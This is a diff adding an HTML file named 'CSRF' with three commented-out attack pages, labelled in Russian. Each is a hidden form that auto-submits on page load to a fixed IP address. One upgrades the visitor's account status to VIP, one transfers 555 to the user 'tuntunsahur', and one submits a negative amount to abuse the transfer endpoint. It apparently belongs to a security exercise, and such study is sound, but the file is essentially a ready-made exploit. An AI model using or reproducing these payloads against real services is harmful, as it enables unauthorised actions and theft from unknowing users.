@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF</title>
+</head>
+<body>
+    <!-- изменение статуса -->
+    <!-- <!DOCTYPE html>
+        <html>
+        <head>
+            <title>...</title>
+        </head>
+        <body>
+            <form id="csrf-form" 
+                action="http://5.129.245.211:5000/update-preferences" 
+                method="POST" 
+                style="display:none;">
+                <select name="status">
+                        <option value="vip">VIP</option>
+                    </select>
+            </form>
+            
+            <script>
+                window.onload = function() {
+                    document.getElementById('csrf-form').submit();
+                };
+            </script>
+        </body>
+        </html> -->
+
+        <!-- перевод средств
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>...</title>
+        </head>
+        <body>
+            <form id="csrf-form" 
+                action="http://5.129.245.211:5000/transfer" 
+                method="POST" 
+                style="display:none;">
+                <input type="number" name="amount" placeholder="Сумма" step="0.01" required value="555">
+                <input type="text" name="target_user" placeholder="Получатель" required value="tuntunsahur">
+                <input type="text" name="comment" placeholder="Комментарий" value="yayyaya">
+            </form>
+            
+            <script>
+                window.onload = function() {
+                    document.getElementById('csrf-form').submit();
+                };
+            </script>
+        </body>
+        </html> -->
+
+        <!-- добавление средств
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>...</title>
+        </head>
+        <body>
+            <form id="csrf-form" 
+                action="http://5.129.245.211:5000/transfer" 
+                method="POST" 
+                style="display:none;">
+                <input type="number" name="amount" placeholder="Сумма" step="0.01" required value="-5555">
+                <input type="text" name="target_user" placeholder="Получатель" required value="tuntunsahur">
+                <input type="text" name="comment" placeholder="Комментарий" value="yayyaya">
+            </form>
+            
+            <script>
+                window.onload = function() {
+                    document.getElementById('csrf-form').submit();
+                };
+            </script>
+        </body>
+        </html> -->
+
+
+    
+</body>
+</html>
